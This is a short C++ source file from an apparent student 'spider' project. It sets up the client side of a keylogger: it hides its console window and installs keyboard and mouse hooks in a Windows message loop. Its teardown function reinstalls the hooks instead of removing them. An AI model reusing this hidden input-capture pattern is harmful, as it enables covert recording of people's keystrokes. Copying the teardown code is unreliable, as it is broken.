/*
** ListenerManager.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/ListenerManager.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:14:20 2017 Gauthier Cler
** Last update Sun Oct 08 22:14:20 2017 Gauthier Cler
*/

#include "ListenerManager.hpp"

Client::ListenerManager::ListenerManager() : _running(false) {

}

Client::ListenerManager::~ListenerManager() {

}

bool Client::ListenerManager::initialize() {
	_listeners.push_back(std::make_unique<KeyboardListener>());
	_listeners.push_back(std::make_unique<MouseListener>());
	for (auto &listener : _listeners) {
		(*listener).createHook(_moduleHandle);
	}
	return false;
}

void Client::ListenerManager::createContext(void) {
	AllocConsole();
	if (!(_windowHandle = FindWindowA("consoleWindowClass", nullptr))) {
		throw ("FindWindowA Crash");
	}
	ShowWindow(_windowHandle, SW_HIDE);
	if (!(_moduleHandle = GetModuleHandle(nullptr))) {
		throw ("Module Handle Crash");
	}
}

void Client::ListenerManager::destroyContext(void) {
	for (auto &listener : _listeners) {
		(*listener).createHook(_moduleHandle);
	}
}

void Client::ListenerManager::run() {
	MSG msg;

	this->createContext();
	this->initialize();
	_running = true;

	while (_running) {
		GetMessage(&msg, NULL, 0, 0);
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	this->destroyContext();
}
